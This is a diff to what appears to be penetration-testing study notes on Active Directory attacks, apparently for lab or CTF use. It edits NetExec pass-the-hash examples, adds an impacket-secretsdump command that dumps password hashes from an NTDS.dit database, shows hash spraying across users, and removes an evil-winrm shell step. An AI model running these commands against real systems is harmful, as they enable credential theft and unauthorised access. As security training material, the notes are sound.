@@ -94,12 +94,7 @@ nxc smb <IP> -u username -H <NTLM_HASH>
 
 Example:
 ```bash
-nxc smb 10.10.10.5 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
-```
-
-Format is `LM:NT` — if you only have the NT hash, use:
-```bash
-nxc smb 10.10.10.5 -u administrator -H :31d6cfe0d16ae931b73c59d7e0c089c0
+nxc smb 10.10.10.5 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
 ```
 
 ---
@@ -233,6 +228,10 @@ After dumping NTDS you have multiple users and hashes. The efficient path is to 
 NTDS output format: `domain\user:RID:LM_hash:NT_hash:::`
 
 ```bash
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee dump.ntds
+
+#Assuming you already took the output from the dump and saved it into a file called dump.ntds, use the next command. If not result to the command above this as it will save the output from the secrets dump into a file
+
 # Usernames only — strips domain prefix, leaving plain username
 awk -F: '{gsub(/.*\\/, "", $1); print $1}' dump.ntds > users.txt
 
@@ -259,17 +258,6 @@ nxc rdp <IP> -u users.txt -H hashes.txt --no-bruteforce
 ```
 
 Look for `[+]` (valid auth) and `(Pwn3d!)` (shell access).
-
-### Step 3 — Drop Into Shell With evil-winrm
-
-Once nxc identifies which account hits, take that specific user and hash to evil-winrm:
-
-```bash
-evil-winrm -u <user> -H <NT_hash> -i <IP>
-```
-
-> evil-winrm is your interactive shell — nxc is the sprayer that tells you which account to use.
-> `-H` takes the NT hash only. Do not pass the LM hash (`aad3b435b51404eeaad3b435b51404ee`) — it always fails.
 
 ---
 
